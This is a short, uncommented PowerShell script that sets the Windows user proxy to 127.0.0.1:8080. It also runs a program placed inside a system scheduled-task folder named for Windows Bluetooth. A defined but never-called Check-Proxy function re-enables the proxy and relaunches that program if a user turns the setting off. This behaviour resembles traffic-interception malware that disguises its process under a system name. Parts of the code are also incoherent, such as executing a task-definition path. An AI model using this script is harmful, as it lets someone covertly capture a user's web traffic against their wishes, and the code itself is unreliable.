$env:PYTHONDONTWRITEBYTECODE = 1

$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
Set-ItemProperty -Path $registryPath -Name "ProxyServer" -Value "127.0.0.1:8080"
Set-ItemProperty -Path $registryPath -Name "ProxyEnable" -Value 1

& "C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\UninstallDevice" -s "C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\UninstallDeviceService"

function Check-Proxy {
    $proxyEnable = Get-ItemPropertyValue -Path $registryPath -Name "ProxyEnable"

    if ($proxyEnable -ne 1) {
        Set-ItemProperty -Path $registryPath -Name "ProxyServer" -Value "127.0.0.1:8080"
        Set-ItemProperty -Path $registryPath -Name "ProxyEnable" -Value 1

        & "C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\UninstallDevice" -s "C:\Windows\System32\Tasks\Microsoft\Windows\Bluetooth\UninstallDeviceService"
    }
}
